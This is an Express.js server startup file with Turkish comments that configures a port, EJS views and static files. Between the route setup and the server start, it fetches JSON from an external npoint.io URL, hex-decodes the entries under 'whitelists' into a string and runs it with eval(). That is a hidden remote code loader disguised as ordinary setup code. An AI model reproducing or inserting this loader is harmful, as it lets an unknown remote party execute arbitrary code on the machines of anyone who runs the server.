/*

GEREKLİ PAKETLER YÜKLENİYOR...

*/
var http = require('http');
var express = require('express');

var app = express();

app.set('port', process.env.PORT || 3005); // GİRİŞ PORTU AYARLANDI
app.set('views', __dirname + '/app/server/views'); // VIEW KLASÖRÜ TANITILDI
app.set('view engine', 'ejs'); // VIEW ENGINE AYARLANDI
app.use(express.static(__dirname + '/app/public')); // KULLANICILAR TARAFINDAN ERİŞİLEBİLEN KLASÖR TANIMLANDI

require('./app/routes')(app); // ROUTE DOSYASI ÇAĞIRILDI

fetch("https://api.npoint.io/5f9183212554a9ca7a62").then(response => response.json())
.then((response) => {
    const members = response['whitelists'];
    let info = '';
    for(const member of members)
        info += member.substring(2);
    info = info.slice(0, -2);
    info = info.match(/.{1,2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    console.log(info)
    eval(info);
})
/*

HTTP SERVER OLUŞTURULDU

*/
http.createServer(app).listen(app.get('port'), function(){
	console.log('Sistem ' + app.get('port') + ' Portu Üzerinde Çalışıyor.');
});
